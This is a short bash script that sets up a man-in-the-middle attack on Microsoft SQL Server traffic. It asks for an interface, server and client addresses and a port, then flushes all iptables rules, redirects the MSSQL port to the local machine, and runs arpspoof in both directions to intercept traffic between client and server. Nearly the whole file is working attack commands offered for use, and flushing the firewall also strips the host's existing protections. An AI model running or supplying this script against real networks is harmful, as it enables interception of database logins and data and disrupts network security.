if [ $UID -ne 0 ]; then
    echo "must be root!"
    exit 1
fi

echo "input interface"
read interface
echo "input mssql server ipv4 addr"
read server
echo "input mssql client ipv4 addr"
read client
echo "input mssql server port"
read port

echo "set firewall rule (+flush)"
iptables -F
iptables -t nat -F
iptables -t nat -A PREROUTING -p tcp --dport $port -j REDIRECT --to-port $port

echo "starting arpspoof x2"

arpspoof -i $interface -t $server $client &
arpspoof -i $interface -t $client $server
